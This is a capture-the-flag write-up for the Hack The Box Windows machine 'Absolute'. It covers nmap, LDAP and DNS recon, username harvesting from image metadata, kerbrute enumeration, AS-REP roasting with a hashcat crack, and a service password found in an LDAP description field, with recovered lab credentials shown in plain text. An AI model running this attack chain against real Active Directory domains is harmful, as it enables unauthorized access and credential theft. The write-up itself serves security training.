---
title: "[HTB] Machine: Absolute"
description: "[HTB] Machine: Absolute"
date: 2023-10-04
menu:
  sidebar:
    name: "[HTB] Machine: Absolute"
    identifier: htb-machine-Absolute
    parent: htb-machines-windows
    weight: 10
hero: images/absolute.png
tags: ["HTB"]
---

# Absolute
## Enumeration
- `nmap`
```
└─$ nmap -Pn -p- 10.10.11.181 --min-rate 10000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-03 19:44 BST
Nmap scan report for 10.10.11.181 (10.10.11.181)
Host is up (0.10s latency).
Not shown: 65509 closed ports
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49686/tcp open  unknown
49692/tcp open  unknown
49699/tcp open  unknown
49703/tcp open  unknown
```
```
└─$ nmap -Pn -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV 10.10.11.181  --min-rate 10000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-03 19:36 BST
Nmap scan report for 10.10.11.181 (10.10.11.181)
Host is up (0.18s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Absolute
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-04 01:35:57Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-10-04T01:36:48+00:00; +6h59m17s from scanner time.
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2023-07-17T21:11:52
|_Not valid after:  2024-07-16T21:11:52
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-10-04T01:36:49+00:00; +6h59m17s from scanner time.
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2023-07-17T21:11:52
|_Not valid after:  2024-07-16T21:11:52
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2023-07-17T21:11:52
|_Not valid after:  2024-07-16T21:11:52
|_ssl-date: 2023-10-04T01:36:48+00:00; +6h59m17s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-10-04T01:36:49+00:00; +6h59m17s from scanner time.
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2023-07-17T21:11:52
|_Not valid after:  2024-07-16T21:11:52
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-10-04T01:36:42
|_  start_date: N/A
|_clock-skew: mean: 6h59m16s, deviation: 0s, median: 6h59m16s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.79 seconds
```
- `smb`
```
└─$ smbclient -N -L //10.10.11.181                                                               
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.181 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```
- `ldap`
```
└─$ ldapsearch -H ldap://dc.absolute.htb -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=absolute,DC=htb
namingcontexts: CN=Configuration,DC=absolute,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=absolute,DC=htb
namingcontexts: DC=DomainDnsZones,DC=absolute,DC=htb
namingcontexts: DC=ForestDnsZones,DC=absolute,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```
```
└─$ ldapsearch -H ldap://dc.absolute.htb -x  -b "DC=absolute,DC=htb"  
# extended LDIF
#
# LDAPv3
# base <DC=absolute,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1                     
```
- `dns`
```
└─$ dig absolute.htb @dc.absolute.htb                                                                                   

; <<>> DiG 9.18.16-1-Debian <<>> absolute.htb @dc.absolute.htb
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 38236
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;absolute.htb.                  IN      A

;; ANSWER SECTION:
absolute.htb.           600     IN      A       10.10.11.181

;; Query time: 103 msec
;; SERVER: 10.10.11.181#53(dc.absolute.htb) (UDP)
;; WHEN: Wed Oct 04 17:29:51 BST 2023
;; MSG SIZE  rcvd: 57

```
```
└─$ dig axfr absolute.htb @dc.absolute.htb 

; <<>> DiG 9.18.16-1-Debian <<>> axfr absolute.htb @dc.absolute.htb
;; global options: +cmd
; Transfer failed.
```
- `dnsenum`
```
└─$ dnsenum --dnsserver 10.10.11.181 -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt absolute.htb
dnsenum VERSION:1.2.6

-----   absolute.htb   -----                                                                                                                                                                                                                


Host's addresses:                                                                                                                                                                                                                           
__________________                                                                                                                                                                                                                          

absolute.htb.                            600      IN    A        10.10.11.181                                                                                                                                                               


Name Servers:                                                                                                                                                                                                                               
______________                                                                                                                                                                                                                              

dc.absolute.htb.                         1200     IN    A        10.10.11.181                                                                                                                                                               


Mail (MX) Servers:                                                                                                                                                                                                                          
___________________                                                                                                                                                                                                                         


Trying Zone Transfers and getting Bind Versions:                                                                                                                                                                                            
_________________________________________________                                                                                                                                                                                           

unresolvable name: dc.absolute.htb at /usr/bin/dnsenum line 900.                                                                                                                                                                            
                                                                                                                                                                                                                                            
Trying Zone Transfer for absolute.htb on dc.absolute.htb ... 
AXFR record query failed: no nameservers


Brute forcing with /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:                                                                                                                                                     
________________________________________________________________________________________                                                                                                                                                    
  
dc.absolute.htb.                         1200     IN    A        10.10.11.181                                                                                                                                                               
domaindnszones.absolute.htb.             600      IN    A        10.10.11.181
forestdnszones.absolute.htb.             600      IN    A        10.10.11.181

absolute.htb class C netranges:
________________________________


Performing reverse lookup on 0 ip addresses:
_____________________________________________

0 results out of 0 IP addresses.

absolute.htb ip blocks:
________________________

done.
```

- Web Server

![](./images/1.png)

- `gobuster`

```
└─$ gobuster dir -u http://absolute.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 50  -x asp,aspx -k
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://absolute.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              asp,aspx
[+] Timeout:                 10s
===============================================================
2023/10/04 18:21:54 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 150] [--> http://absolute.htb/images/]
/css                  (Status: 301) [Size: 147] [--> http://absolute.htb/css/]
/js                   (Status: 301) [Size: 146] [--> http://absolute.htb/js/]
/fonts                (Status: 301) [Size: 149] [--> http://absolute.htb/fonts/]
```

- `feroxbuster`
```
└─$ feroxbuster -u http://absolute.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://absolute.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        2l       10w      150c http://absolute.htb/images => http://absolute.htb/images/
301      GET        2l       10w      146c http://absolute.htb/js => http://absolute.htb/js/
301      GET        2l       10w      147c http://absolute.htb/css => http://absolute.htb/css/
200      GET       33l       64w      782c http://absolute.htb/js/main.js
200      GET        6l       77w     3351c http://absolute.htb/css/owl.carousel.min.css
200      GET      145l      442w     4030c http://absolute.htb/css/style.css
200      GET        5l      369w    21003c http://absolute.htb/js/popper.min.js
200      GET        7l      277w    44342c http://absolute.htb/js/owl.carousel.min.js
200      GET     4919l     8218w    79820c http://absolute.htb/fonts/icomoon/style.css
200      GET        0l        0w    86926c http://absolute.htb/js/jquery-3.3.1.min.js
200      GET        0l        0w    77906c http://absolute.htb/css/animate.css
200      GET        0l        0w  5501527c http://absolute.htb/images/hero_6.jpg
200      GET        0l        0w  1834774c http://absolute.htb/images/hero_5.jpg
200      GET        0l        0w  2085276c http://absolute.htb/images/hero_4.jpg
200      GET        0l        0w   160392c http://absolute.htb/css/bootstrap.min.css
200      GET        0l        0w   374185c http://absolute.htb/images/hero_2.jpg
200      GET        0l        0w    63240c http://absolute.htb/js/bootstrap.min.js
200      GET        0l        0w   381437c http://absolute.htb/images/hero_3.jpg
200      GET        0l        0w   407495c http://absolute.htb/images/hero_1.jpg
200      GET       85l      196w     2909c http://absolute.htb/
403      GET       29l       92w     1233c http://absolute.htb/fonts/
403      GET       29l       92w     1233c http://absolute.htb/fonts/icomoon/
301      GET        2l       10w      149c http://absolute.htb/fonts => http://absolute.htb/fonts/
301      GET        2l       10w      163c http://absolute.htb/fonts/icomoon/fonts => http://absolute.htb/fonts/icomoon/fonts/

```

## Foothold
- I downloaded the `hero` images
  - Let's run them via `exiftool` and look for authors
```
└─$ for i in {1..6}; do (exiftool hero_$i.jpg | grep Author | awk '{print $3 " " $4}'); done
James Roberts
Michael Chaffrey
Donald Klay
Sarah Osvald
Jeffer Robinson
Nicole Smith

```
- Now, we have a list of users
  - Let's generate a user list
```
└─$ username-anarchy -i usernames > user.list
```
```
└─$ head user.list
james
jamesroberts
james.roberts
jamesrob
jamerobe
jamesr
j.roberts
jroberts
rjames
r.james
```

- Let's find valid users
```
└─$ kerbrute userenum --dc dc.absolute.htb -d absolute.htb user.list   

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/04/23 - Ronnie Flathers @ropnop

2023/10/04 18:47:10 >  Using KDC(s):
2023/10/04 18:47:10 >   dc.absolute.htb:88

2023/10/04 18:47:10 >  [+] VALID USERNAME:       j.roberts@absolute.htb
2023/10/04 18:47:10 >  [+] VALID USERNAME:       m.chaffrey@absolute.htb
2023/10/04 18:47:11 >  [+] VALID USERNAME:       s.osvald@absolute.htb
2023/10/04 18:47:11 >  [+] VALID USERNAME:       d.klay@absolute.htb
2023/10/04 18:47:11 >  [+] VALID USERNAME:       j.robinson@absolute.htb
2023/10/04 18:47:11 >  [+] VALID USERNAME:       n.smith@absolute.htb
2023/10/04 18:47:12 >  Done! Tested 88 usernames (6 valid) in 1.454 seconds
```

- Let's see if any of valid users is `AS-REP`-Roastable
```
└─$ impacket-GetNPUsers -dc-ip dc.absolute.htb -usersfile user.list absolute.htb/
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User j.roberts doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User m.chaffrey doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User s.osvald doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$d.klay@ABSOLUTE.HTB:496204f8dd4267acdea35229d3482c2d$416205d46cb698bf8c23274bf389333b88833c779b9dccb21a57f67ee21c5433de9a2c5003a187c29cf9288b654bc9f8771439ed11a9dc0b109aa256bdb9321079c91e8650bbe113069a9c5872a735ab7c1f7b6aca81fbb523646dd13d96999acfc814e17a3e6819452e0d9be4f1002a380d172bf2ad4b89218018daeea5112c863742e21e43ff333d70cd58f822126bf95dbcbb08bbfe922a04d74eb6cea046adb1d4a3b54199ae62c48cb76cd0de9626cc3830e229d4fb1fa9a232c80edb402ece738142cc979888523f544b21ec1a0d5e78205866653c167af0da000d2957b17336a23c254e8f7c7413c7
[-] User j.robinson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User n.smith doesn't have UF_DONT_REQUIRE_PREAUTH set
```

- Let's crack the hash
```
└─$ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt     
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-12th Gen Intel(R) Core(TM) i5-12400, 1436/2936 MB (512 MB allocatable), 2MCU
...
$krb5asrep$23$d.klay@ABSOLUTE.HTB:496204f8dd4267acdea35229d3482c2d$416205d46cb698bf8c23274bf389333b88833c779b9dccb21a57f67ee21c5433de9a2c5003a187c29cf9288b654bc9f8771439ed11a9dc0b109aa256bdb9321079c91e8650bbe113069a9c5872a735ab7c1f7b6aca81fbb523646dd13d96999acfc814e17a3e6819452e0d9be4f1002a380d172bf2ad4b89218018daeea5112c863742e21e43ff333d70cd58f822126bf95dbcbb08bbfe922a04d74eb6cea046adb1d4a3b54199ae62c48cb76cd0de9626cc3830e229d4fb1fa9a232c80edb402ece738142cc979888523f544b21ec1a0d5e78205866653c167af0da000d2957b17336a23c254e8f7c7413c7:Darkmoonsky248girl
...
```

- Let's test the creds
  - `d.klay:Darkmoonsky248girl`
  - `STATUS_ACCOUNT_RESTRICTION` means we have to use `-k` for Kerberos auth
    - In case you see `KRB_AP_ERR_SKEW`, just run `sudo ntpdate 10.10.11.181`, since kerberos requires time sync
```
└─$ crackmapexec smb absolute.htb -u d.klay -p 'Darkmoonsky248girl'           
SMB         absolute.htb    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         absolute.htb    445    DC               [-] absolute.htb\d.klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
```
```
└─$ crackmapexec smb absolute.htb -u d.klay -p 'Darkmoonsky248girl' -k
SMB         absolute.htb    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         absolute.htb    445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl
```

## User #1
- Let's gather domain information
```
└─$ impacket-getTGT absolute.htb/d.klay:'Darkmoonsky248girl' -dc-ip dc.absolute.htb 
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Saving ticket in d.klay.ccache
```
```
└─$ KRB5CCNAME=d.klay.ccache bloodhound-python -u d.klay -d absolute.htb -dc dc.absolute.htb -ns 10.10.11.181 -c ALL --zip -k                    
Password: 
INFO: Found AD domain: absolute.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc.absolute.htb
INFO: Kerberos auth to LDAP failed, trying NTLM
ERROR: Failure to authenticate with LDAP! Error 8009030C: LdapErr: DSID-0C0906B5, comment: AcceptSecurityContext error, data 52f, v4563
```

- I received an error using `bloodhound`
  - Let's use `ldapsearch`
  - But we need a ticket
```
└─$ cat /etc/krb5.conf 
[libdefaults]
        default_realm = ABSOLUTE.HTB

[realms]
        ABSOLUTE.HTB = {
                kdc = 10.10.11.181
        }

[domain_realm]
        .absolute.htb = ABSOLUTE.HTB
        absolute.htb = ABSOLUTE.HTB 

```
```
└─$ kinit d.klay

```
```
└─$ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: d.klay@ABSOLUTE.HTB

Valid starting       Expires              Service principal
10/05/2023 02:05:40  10/05/2023 06:05:40  krbtgt/ABSOLUTE.HTB@ABSOLUTE.HTB
        renew until 10/05/2023 06:05:40

```

- Now, we run `ldapsearch`
  - Let's check users
  - Make sure that
    - `/etc/hosts` has the following entry `10.10.11.181    dc.absolute.htb absolute.htb`
    - `libsasl2-modules-gssapi-mit` is installed
  - We could also run `crackmapexec ldap 10.10.11.181 -u d.klay -p 'Darkmoonsky248girl' -k --users`
```
└─$ ldapsearch -H ldap://absolute.htb -Y GSSAPI -b "cn=users,dc=absolute,dc=htb"
SASL/GSSAPI authentication started
SASL username: d.klay@ABSOLUTE.HTB
SASL SSF: 256
SASL data security layer installed.
# extended LDIF
#
# LDAPv3
# base <cn=users,dc=absolute,dc=htb> with scope subtree
...
dn: CN=svc_smb,CN=Users,DC=absolute,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: svc_smb
description: AbsoluteSMBService123!
distinguishedName: CN=svc_smb,CN=Users,DC=absolute,DC=htb
instanceType: 4
whenCreated: 20220609082551.0Z
whenChanged: 20220822163634.0Z
uSNCreated: 16636
memberOf: CN=Protected Users,CN=Users,DC=absolute,DC=htb
uSNChanged: 40999
name: svc_smb
...
# search result
search: 4
result: 0 Success

# numResponses: 42
# numEntries: 41

```

- `svc_smb` looks like has a password in `description` field
  - `svc_smb:AbsoluteSMBService123!`
  - The creds are valid
```
└─$ sudo ntpdate 10.10.11.181; crackmapexec smb 10.10.11.181 -u svc_smb -p 'AbsoluteSMBService123!' -k 
2023-10-05 03:00:19.193039 (+0100) +25157.322135 +/- 0.050155 10.10.11.181 s1 no-leap
CLOCK: time stepped by 25157.322135
SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.181    445    DC               [+] absolute.htb\svc_smb:AbsoluteSMBService123!
```

